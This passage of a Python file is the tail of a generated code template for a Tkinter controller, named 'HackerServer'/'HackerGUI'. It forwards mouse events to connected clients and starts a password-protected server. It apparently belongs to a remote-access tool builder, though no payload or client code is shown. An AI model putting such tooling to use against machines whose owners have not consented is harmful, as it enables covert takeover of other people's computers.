        self.server.send_input(self.current_client, "mouse_move", x=event.x, y=event.y)

    def _on_mouse_release(self, event):
        pass

    def _on_mouse_double(self, event):
        if not self._control_active or not self.current_client:
            return
        self.server.send_input(self.current_client, "mouse_double", x=event.x, y=event.y)

    def _on_mouse_scroll(self, event):
        if not self._control_active or not self.current_client:
            return
        amount = -1 if event.delta > 0 else 1
        self.server.send_input(self.current_client, "mouse_scroll", x=event.x, y=event.y, amount=amount)

    def _on_mouse_move(self, event):
        pass

    def _poll_clients(self):
        self._refresh_clients()
        self.root.after(2000, self._poll_clients)

    def run(self):
        self.root.mainloop()

    def stop(self):
        self.server.stop()
        self.root.destroy()


def main():
    server = HackerServer(port={port}, password="{password}")
    server.start()
    gui = HackerGUI(server)
    gui.run()
    server.stop()


if __name__ == "__main__":
    main()
'''
